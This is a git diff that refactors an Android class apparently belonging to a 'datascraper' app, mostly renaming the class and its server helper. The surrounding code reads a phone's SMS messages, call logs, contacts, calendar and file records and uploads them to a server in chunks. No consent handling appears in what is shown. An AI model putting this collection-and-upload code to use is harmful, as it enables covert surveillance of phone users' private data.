@@ -1,15 +1,12 @@
 package com.example.alex.datascraper;
 
-import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
-import android.widget.Toast;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -19,7 +16,7 @@ import java.util.List;
  * and sending it to a server. Also tracks which threads are still running.
  */
 
-public class modalityHabits extends AppCompatActivity {
+public class ModalityHabits extends AppCompatActivity {
 
     // approximate chunk size of data to send
     // must send complete json objects so usually more characters will send
@@ -51,7 +48,7 @@ public class modalityHabits extends AppCompatActivity {
         // when all threads that will be started have been started and also finished, mark as done sending
         // and send the END message to the server
         if(activeThreads <= 0 && dispatchDone){
-            serverHook.sendToServer("debug", "END");
+            ServerHook.sendToServer("debug", "END");
             Log.d("MYAPP", "ALL DONE");
             DONE = true;
         }
@@ -161,10 +158,10 @@ public class modalityHabits extends AppCompatActivity {
                     if(msgData.length() > chunkSize){
                         msgData = msgData.substring(0, msgData.length()-1);
                         msgData += "]";
-                        serverHook.sendToServer("text", msgData);
+                        ServerHook.sendToServer("text", msgData);
                         msgData = "[";
                     }
-                    //serverHook.sendToServer("text",msgData);
+                    //ServerHook.sendToServer("text",msgData);
                 } while (cursor.moveToNext());
             } else {
                 System.out.println("No messages found");
@@ -205,10 +202,10 @@ public class modalityHabits extends AppCompatActivity {
                     if(msgData.length() > chunkSize){
                         msgData = msgData.substring(0, msgData.length()-1);
                         msgData += "]";
-                        serverHook.sendToServer("text", msgData);
+                        ServerHook.sendToServer("text", msgData);
                         msgData = "[";
                     }
-                    //serverHook.sendToServer("text",msgData);
+                    //ServerHook.sendToServer("text",msgData);
                 } while (cursor.moveToNext());
             } else {
                 System.out.println("No messages found");
@@ -217,7 +214,7 @@ public class modalityHabits extends AppCompatActivity {
             if(msgData.length() > 1){
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "]";
-                serverHook.sendToServer("text", msgData);
+                ServerHook.sendToServer("text", msgData);
             }
 
         }
@@ -259,7 +256,7 @@ public class modalityHabits extends AppCompatActivity {
                     if(msgData.length() > chunkSize){
                         msgData = msgData.substring(0, msgData.length()-1);
                         msgData += "]";
-                        serverHook.sendToServer("log", msgData);
+                        ServerHook.sendToServer("log", msgData);
                         msgData = "[";
                     }
 
@@ -271,7 +268,7 @@ public class modalityHabits extends AppCompatActivity {
             if(msgData.length() > 1){
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "]";
-                serverHook.sendToServer("log", msgData);
+                ServerHook.sendToServer("log", msgData);
             }
         }
 
@@ -310,7 +307,7 @@ public class modalityHabits extends AppCompatActivity {
                 if(msgData.length() > chunkSize){
                     msgData = msgData.substring(0, msgData.length()-1);
                     msgData += "]";
-                    serverHook.sendToServer("contact", msgData);
+                    ServerHook.sendToServer("contact", msgData);
                     msgData = "[";
                 }
             }
@@ -318,7 +315,7 @@ public class modalityHabits extends AppCompatActivity {
             if(msgData.length() > 1){
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "]";
-                serverHook.sendToServer("contact", msgData);
+                ServerHook.sendToServer("contact", msgData);
             }
         }
 
@@ -357,7 +354,7 @@ public class modalityHabits extends AppCompatActivity {
                     if(msgData.length() > chunkSize){
                         msgData = msgData.substring(0, msgData.length()-1);
                         msgData += "]";
-                        serverHook.sendToServer("calendar", msgData);
+                        ServerHook.sendToServer("calendar", msgData);
                         msgData = "[";
                     }
 
@@ -369,7 +366,7 @@ public class modalityHabits extends AppCompatActivity {
             if(msgData.length() > 1){
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "]";
-                serverHook.sendToServer("calendar", msgData);
+                ServerHook.sendToServer("calendar", msgData);
             }
         }
 
@@ -409,7 +406,7 @@ public class modalityHabits extends AppCompatActivity {
                     if(msgData.length() > chunkSize){
                         msgData = msgData.substring(0, msgData.length()-1);
                         msgData += "]";
-                        serverHook.sendToServer("file", msgData);
+                        ServerHook.sendToServer("file", msgData);
                         msgData = "[";
                     }
                 } while (cursor.moveToNext());
@@ -420,7 +417,7 @@ public class modalityHabits extends AppCompatActivity {
             if(msgData.length() > 1){
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "]";
-                serverHook.sendToServer("file", msgData);
+                ServerHook.sendToServer("file", msgData);
             }
         }
     }
